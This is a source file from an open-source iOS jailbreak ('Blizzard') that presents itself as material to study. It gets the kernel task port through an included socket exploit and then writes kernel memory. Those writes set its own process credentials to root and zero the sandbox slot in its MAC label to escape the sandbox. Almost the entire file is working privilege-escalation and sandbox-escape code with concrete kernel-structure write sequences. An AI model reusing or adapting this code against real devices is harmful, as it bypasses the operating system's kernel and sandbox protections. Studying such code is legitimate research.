//
//  blizzardJailbreak.c
//
//  Created by GeoSn0w on 8/10/20.
//  Copyright © 2020 GeoSn0w. All rights reserved.
//
#import <Foundation/Foundation.h>
#include "blizzardJailbreak.h"
#include "../sock_port/exploit.h"
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <netinet/in.h>
#include <mach/mach.h>
#include <sys/mman.h>
#include "../sock_port/kernel_memory.h"
#include "../sock_port/offsetof.h"
#include "../sock_port/offsets.h"
#include "../PatchFinder/patchfinder64.h"
#include "../Kernel Utilities/kernel_utils.h"
#include "../Kernel Utilities/kexecute.h"
#include "BlizzardLog.h"

mach_port_t tfp0 = 0;
uint64_t KernelBase;
uint64_t defaultCredentials;

int exploit_init(){
    printf("Blizzard Jailbreak\nby GeoSn0w (@FCE365)\n\nAn Open-Source Jailbreak for you to study and dissect :-)\n\n");
    tfp0 = get_tfp0();
    if (MACH_PORT_VALID(tfp0)){
        printf("Successfully got tfp0!\n");
        init_kernel_utils(tfp0);
        KernelBase = grabKernelBase();
        if (!KernelBase) {
            printf("ERROR: Failed to find kernel base\n");
            return 2;
        }
        kernel_slide = (uint32_t)(KernelBase - 0xFFFFFFF007004000);
        int ret = init_kernel(KernelBase, NULL); // patchfinder
        if (ret) {
            printf("Failed to initialize patchfinder\n");
            return 3;
        }
        printf("Initialized patchfinder\n");
        findOurOwnProcess();
        rootifyOurselves();
        defaultCredentials = escapeSandboxForProcess(getpid());
        restoreProcessCredentials(defaultCredentials, getpid());
        init_Kernel_Execute();
        term_Kernel_Execute();
        term_kernel();
    
        return 0;
    } else {
        printf("ERROR: Could not get tfp0!\n");
        return -1;
    }
   
}


int rootifyOurselves(){
    printf("Preparing to elevate own privileges to ROOT!\n");
    printf("    Current UID: %d\n", getuid());
    printf("    Current EUID: %d\n", geteuid());
    uint64_t proc = proc_of_pid(getpid()); // Get our PID's PROC structure.
    uint64_t ucred = rk64(proc + off_p_ucred); //Get our credentials.
    wk32(proc + off_p_uid, 0);
    wk32(proc + off_p_ruid, 0);
    wk32(proc + off_p_gid, 0);
    wk32(proc + off_p_rgid, 0);
    wk32(ucred + off_ucred_cr_uid, 0);
    wk32(ucred + off_ucred_cr_ruid, 0);
    wk32(ucred + off_ucred_cr_svuid, 0);
    wk32(ucred + off_ucred_cr_ngroups, 1);
    wk32(ucred + off_ucred_cr_groups, 0);
    wk32(ucred + off_ucred_cr_rgid, 0);
    wk32(ucred + off_ucred_cr_svgid, 0);
    
    printf("    New UID: %d\n", getuid());
    printf("    New EUID: %d\n", geteuid());
    
    if (getuid() != 501 && geteuid() != 501){
        printf("Successfully got ROOT!\n");
    } else {
        printf("ERROR: Failed to get ROOT!\n");
        return -1;
    }
    return 0;
}
int restoreProcessCredentials(uint64_t creds, pid_t pid){
    uint64_t proc = proc_of_pid(pid);
    uint64_t ucred = rk64(proc + off_p_ucred);
    uint64_t cr_label = rk64(ucred + off_ucred_cr_label);
    wk64(cr_label + off_sandbox_slot, creds);
    
    if (rk64(rk64(ucred + off_ucred_cr_label) + off_sandbox_slot) != 0){
        printf("Successfully restored the Sandbox!\n");
        return 0;
    } else {
        printf("ERROR: Failed to restore the Sandbox!\n");
        return -1;
    }
}
uint64_t escapeSandboxForProcess(pid_t proc_pid) {
    printf("Preparing to escape the sandbox...\n");
    uint64_t target_process;
    uint64_t ucred;
    uint64_t sb_cr_label;
    uint64_t default_creds;
    
    if (proc_pid == 0) {
        printf("ERROR: Will NOT mess with Kernel's PID...\n");
        return -2;
    }
    
    target_process = proc_of_pid(proc_pid);
    ucred = rk64(target_process + off_p_ucred);
    sb_cr_label = rk64(ucred + off_ucred_cr_label);
    default_creds = rk64(sb_cr_label + off_sandbox_slot);
    wk64(sb_cr_label + off_sandbox_slot, 0);
    
    /*
     As far as I am aware, the first slot is used by AMFI. Sandbox should be the second.
     Read Jonathan Levin's book on the Sandbox chaper for more details about the credentials.
     */
    
    if (rk64(rk64(ucred + off_ucred_cr_label) + off_sandbox_slot) == 0){
        printf("Successfully escaped the Sandbox!\n");
        return default_creds;
    } else {
        printf("ERROR: Failed to escape the Sandbox!\n");
        return -1;
    }
}

int rootifyProcessByPid(){
    return 0;
}

uint64_t findOurOwnProcess(){
    static uint64_t self = 0;
    if (!self) {
        self = rk64(current_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
        printf("Found Ourselves at 0x%llx\n", self);
    } else {
        printf("ERROR: Cannot find our own process!\n");
    }
    return self;
}